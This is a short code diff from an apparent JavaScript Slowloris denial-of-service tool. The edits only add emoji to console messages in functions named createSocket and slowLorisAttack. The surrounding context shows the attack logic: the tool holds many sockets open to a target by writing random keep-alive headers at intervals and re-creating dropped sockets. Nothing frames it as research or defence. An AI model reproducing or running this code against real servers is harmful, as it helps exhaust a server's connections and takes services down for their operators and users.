@@ -19,7 +19,7 @@ function createSocket(host, port, useHttps) {
     if (beforeReject) {
       return;
     }
-    console.error(`Connection was rejected.`);
+    console.error(`😢 Connection was rejected.`);
     beforeReject = true;
     setTimeout(() => {
       beforeReject = false;
@@ -46,7 +46,7 @@ function slowLorisAttack(host, port, sockets, useHttps, sleepTime) {
 
   setInterval(() => {
     console.log("Sending keep-alive headers...");
-    console.log(`Socket count: ${socketList.length}`);
+    console.log(`📞 Socket count: ${socketList.length}`);
 
     socketList.forEach((socket, index) => {
       socket.write(`X-a: ${Math.floor(Math.random() * 5000)}\r\n`, (err) => {
@@ -60,7 +60,7 @@ function slowLorisAttack(host, port, sockets, useHttps, sleepTime) {
     const diff = socketCount - socketList.length;
     if (diff <= 0) return;
 
-    console.log(`Creating ${diff} new sockets...`);
+    console.log(`🧑‍🔧 Creating ${diff} new sockets...`);
     for (let i = 0; i < diff; i++) {
       const socket = createSocket(host, port, useHttps);
       if (socket) {
